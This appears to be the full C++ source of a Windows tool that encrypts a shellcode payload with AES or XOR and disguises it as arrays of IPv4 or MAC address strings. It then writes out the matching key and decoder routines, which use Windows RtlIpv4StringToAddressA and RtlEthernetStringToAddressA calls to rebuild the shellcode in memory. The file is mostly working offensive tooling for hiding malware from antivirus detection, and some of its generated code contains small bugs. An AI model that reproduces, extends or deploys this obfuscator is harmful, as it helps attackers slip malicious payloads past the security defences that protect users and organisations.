#include "aes.c"
#include <iostream>
#include <random>
#include <stdio.h>
#include <stdlib.h>
#include <vector>
#include <cstdio>
#include <Windows.h>
#pragma warning(disable:4996)

// generate IPv4 output
const char* GenerateIPv4(uint32_t ip) {
    unsigned char bytes[4];
    char* Output = new char[32];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
    sprintf(Output, "%d.%d.%d.%d", bytes[3], bytes[2], bytes[1], bytes[0]);
    return (const char*)Output;
}

// Generate hex IPv4 output
uint32_t GenerateIPv4Hex(int a, int b, int c, int d) {
    uint32_t result = ((uint32_t)a << 24) | ((uint32_t)b << 16) | (c << 8) | d;
    return result;
}

// Convert the encrypted payload to a IPv4 array
void GenerateIPv4Output(SIZE_T payloadSize, unsigned char* payload, FILE* file) {

    char WriteConfig[128], CharIP[128];
    char WriteDecoderFunc[1024] = "BOOL DecodeIPv4Fuscation(const char* IPV4[], PVOID LpBaseAddress) {\n\tPCSTR Terminator = NULL;\n\tPVOID LpBaseAddress2 = NULL;\n\tNTSTATUS STATUS;\n\tint i = 0;\n\tfor (int j = 0; j < ElementsNumber; j++) {\n\t\tLpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);\n\t\tSTATUS = RtlIpv4StringToAddressA((PCSTR)IPV4[j], FALSE, &Terminator, (in_addr*)LpBaseAddress2);\n\t\tif (!NT_SUCCESS(STATUS)) {\n\t\t\tprintf(\"[!] RtlIpv6StringToAddressA failed for %s result %x\", IPV4[j], STATUS);\n\t\t\treturn FALSE;\n\t\t}\n\t\telse {\n\t\t\ti = i + 4;\n\t\t}\n\t}\n\treturn TRUE;\n}\n";

    fprintf(file, "\nconst char * IPv4Shell [] = { \n\t");

    // algorithm that converts raw shellcode to IPv4 addresses
    int c = 4, C = 0;
    uint32_t HexVal;
    std::vector<const char*> IPs;
    for (int i = 0; i <= payloadSize; i++) {
        if (c == 4) {
            C++;
            HexVal = GenerateIPv4Hex(payload[i], payload[i + 1], payload[i + 2], payload[i + 3]);
            const char* IP = GenerateIPv4(HexVal);
            IPs.push_back(IP);
            if (i == payloadSize - 4) {
                sprintf(CharIP, "\"%s\"", IPs[C - 1]);
                fprintf(file, "%s", CharIP);;
                break;
            }
            else {
                sprintf(CharIP, "\"%s\", ", IPs[C - 1]);
                fprintf(file, "%s", CharIP);
            }
            c = 1;
            if (C % 12 == 0) {
                fprintf(file, "\n\t");
            }
        }
        else {
            c++;
        }
    }
    // print out deobfuscation function
    fprintf(file, "\n};\n");
    sprintf(WriteConfig, "#define ElementsNumber %d\n#define SizeOfShellcode %d\n\n", C, (unsigned int)payloadSize);
    fprintf(file, "%s", WriteConfig);
    fprintf(file, "%s", WriteDecoderFunc);

    // Delete the memory for each IP
    for (int i = 0; i < IPs.size(); i++) {
        delete[] IPs[i];
    }
}

// Generate MAC output
const char* GenerateMAC(uint64_t MAC) {
    unsigned char bytes[6];
    char* Output = new char[64];
    bytes[0] = MAC & 0xFF;
    bytes[1] = (MAC >> 8) & 0xFF;
    bytes[2] = (MAC >> 16) & 0xFF;
    bytes[3] = (MAC >> 24) & 0xFF;
    bytes[4] = (MAC >> 32) & 0xFF;
    bytes[5] = (MAC >> 40) & 0xFF;
    sprintf(Output, "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X", (bytes[5]), (bytes[4]), (bytes[3]), (bytes[2]), (bytes[1]), (bytes[0]));
    return (const char*)Output;
}

// Generate hex MAC values
uint64_t GenerateMACHex(int a, int b, int c, int d, int e, int f) {
    uint64_t result = ((uint64_t)a << 40) | ((uint64_t)b << 32) | ((uint64_t)c << 24) | ((uint64_t)d << 16) | ((uint64_t)e << 8) | f;
    return result;
}

// Convert the encrypted payload to a MAC address array
void GenerateMACOutput(SIZE_T ShellcodeSize, unsigned char* FinallShell, FILE* file) {


    char WriteConfig[128], CharMAC[128];
    char WriteDecoderFunc[1024] = "BOOL DecodeMACFuscation(const char* MAC[], PVOID LpBaseAddress) {\n\tPCSTR Terminator = NULL;\n\tPVOID LpBaseAddress2 = NULL;\n\tNTSTATUS STATUS;\n\tint i = 0;\n\tfor (int j = 0; j < ElementsNumber; j++) {\n\t\tLpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);\n\t\tSTATUS = RtlEthernetStringToAddressA((PCSTR)MAC[j], &Terminator, (DL_EUI48*)LpBaseAddress2);\n\t\tif (!NT_SUCCESS(STATUS)) {\n\t\t\tprintf(\"[!] RtlEthernetStringToAddressA failed for %s result %x\", MAC[j], STATUS);\n\t\t\treturn FALSE;\n\t\t}\n\t\telse {\n\t\t\ti = i + 6;\n\t\t}\n\t}\n\treturn TRUE;\n}\n";

    fprintf(file, "\nconst char * MACShell [] = { \n\t");

    // Algorithm that converts raw shellcode to MAC addresses
    int c = 6, C = 0;
    uint64_t HexVal;
    std::vector<const char*> macs;
    for (int i = 0; i <= ShellcodeSize; i++) {
        if (c == 6) {
            C++;
            HexVal = GenerateMACHex(FinallShell[i], FinallShell[i + 1], FinallShell[i + 2], FinallShell[i + 3], FinallShell[i + 4], FinallShell[i + 5]);
            const char* mac = GenerateMAC(HexVal);
            macs.push_back(mac);
            if (i == ShellcodeSize - 6) {
                sprintf(CharMAC, "\"%s\"", macs[C - 1]);
                fprintf(file, "%s", CharMAC);
                break;
            }
            else {
                sprintf(CharMAC, "\"%s\", ", macs[C - 1]);
                fprintf(file, "%s", CharMAC);
            }
            c = 1;
            if (C % 8 == 0) {
                fprintf(file, "\n\t");
            }
        }
        else {
            c++;
        }
    }

    fprintf(file, "\n};\n");
    sprintf(WriteConfig, "#define ElementsNumber %d\n#define SizeOfShellcode %d\n\n", C, (unsigned int)ShellcodeSize);
    fprintf(file, "%s", WriteConfig);
    fprintf(file, "%s", WriteDecoderFunc);

    // Delete the memory for each MAC string
    for (int i = 0; i < macs.size(); i++) {
        delete[] macs[i];
    }
}

void EncryptAES(SIZE_T file_size, unsigned char* payload, FILE* file) {

    // print the header
    fprintf(file, "#include \"aes.c\"\n");
    char WriteHeader[256] = "#include <Windows.h>\n#include <stdio.h>\n#include <Ip2string.h>\n#pragma comment(lib, \"Ntdll.lib\")\n\n#ifndef NT_SUCCESS\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n#endif\n";
    fprintf(file, "%s", WriteHeader);

    // Generate a key and IV
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::vector <unsigned char> key_init(16);
    std::vector <unsigned char> iv_init(16);
    for (auto& b : key_init) {
        b = static_cast<unsigned char>(dis(gen));
    }
    for (auto& b : iv_init) {
        b = static_cast<unsigned char>(dis(gen));
    }
    const unsigned char* Key = key_init.data();
    const unsigned char* IV = iv_init.data();

    // Encrypt the payload using the generated key and IV
    AES_ctx ctx = { 0 };
    AES_init_ctx_iv(&ctx, Key, IV);
    AES_CBC_encrypt_buffer(&ctx, payload, file_size);

    // Write the key
    fprintf(file, "\nunsigned char key[] {");
    for (int i = 0; i < key_init.size(); i++) {
        fprintf(file, "0x%x, ", Key[i]);
    }
    fprintf(file, "};\n");

    // Write the IV
    fprintf(file, "\nunsigned char IV[] {");
    for (int i = 0; i < iv_init.size(); i++) {
        fprintf(file, "0x%x, ", IV[i]);
    }
    fprintf(file, "};\n");

    // Write the decryption function
    fprintf(file, "\nAES_ctx ctx = { 0 };\nAES_init_ctx_iv(&ctx, key, iv);\nAES_CBC_decrypt_buffer(&ctx, payload, sizeof(payload));\n");
}

void EncryptXOR(SIZE_T file_size, unsigned char* payload, FILE* file) {

    char WriteHeader[256] = "#include <Windows.h>\n#include <stdio.h>\n#include <Ip2string.h>\n#pragma comment(lib, \"Ntdll.lib\")\n\n#ifndef NT_SUCCESS\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n#endif\n";
    fprintf(file, "%s", WriteHeader);

    // Generate a random key
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::vector <unsigned char> Key(16);
    for (auto& b : Key) {
        b = static_cast<unsigned char>(dis(gen));
    }

    // XOR with every byte of the key for hardening
    for (size_t i = 0, j = 0; i < file_size; i++, j++) {
        if (j == Key.size()) {
            j = 0;
        }
        payload[i] = payload[i] ^ Key[j];
    }

    // Write the key
    fprintf(file, "\nunsigned char key[] {");
    for (int i = 0; i < Key.size(); i++) {
        fprintf(file, "0x%x, ", Key[i]);
    }
    fprintf(file, "};\n");

    // Write the decryption function
    fprintf(file, "\nfor (size_t i = 0, j = 0; i < file_size; i++, j++) {\n\tif (j == Key.size()) {\n\t\tj = 0;\n\t}\n\tpayload[i] = payload[i] ^ Key[j];\n}\n");
}

int main(int argc, char* argv[]) {

    // Check if the correct number of arguments have been passed
    if (argc != 5) {
        std::cout << "Usage: " << argv[0] << " <PayloadFile> <OutputFile> <EncryptionMethod> <ObfuscationMethod>\n";
        return 1;
    }

    // Open payload file in binary mode
    FILE* payloadFile = fopen(argv[1], "rb");
    if (payloadFile == NULL) {
        printf("Error: Failed to open file.\n");
        return 1;
    }

    // Open output file in append mode
    FILE* outputFile = fopen(argv[2], "w");
    if (outputFile == NULL) {
        printf("Error: Failed to open output file.\n");
        return 1;
    }

    // Define the encryption and obfuscation type
    const std::string encryptionAlgorithm = argv[3];
    const std::string obfuscationMethod = argv[4];

    // Check for correct usage
    if (encryptionAlgorithm != "AES" && encryptionAlgorithm != "XOR" && encryptionAlgorithm != "NONE") {
        printf("Error: Please select a valid encryption algorithm. Currently supported options: AES, XOR, NONE (case sensitive)\n");
    }
    if (obfuscationMethod != "MAC" && obfuscationMethod != "IPv4") {
        printf("Error: Please select a valid obfuscation method. Currently supported options: IPv4, MAC (case sensitive)\n");
    }

    // Get the size of the file
    fseek(payloadFile, 0, SEEK_END);
    long file_size = ftell(payloadFile);
    rewind(payloadFile);

    // Create a buffer for the payload
    unsigned char* payload = (unsigned char*)malloc(file_size);
    if (payload == NULL) {
        printf("Error: Memory allocation failed.\n");
        return 1;
    }

    // Copy the payload into the buffer
    fread(payload, 1, file_size, payloadFile);

    // Close the payload file
    fclose(payloadFile);

    // Encrypt
    if (encryptionAlgorithm == "AES") {
        EncryptAES(file_size, payload, outputFile);
    }
    if (encryptionAlgorithm == "XOR") {
        EncryptXOR(file_size, payload, outputFile);
    }
    else {

    }

    // Obfuscate
    if (obfuscationMethod == "MAC") {
        GenerateMACOutput(file_size, payload, outputFile);
    }
    else {
        GenerateIPv4Output(file_size, payload, outputFile);
    }

    fclose(outputFile);

    return 0;
}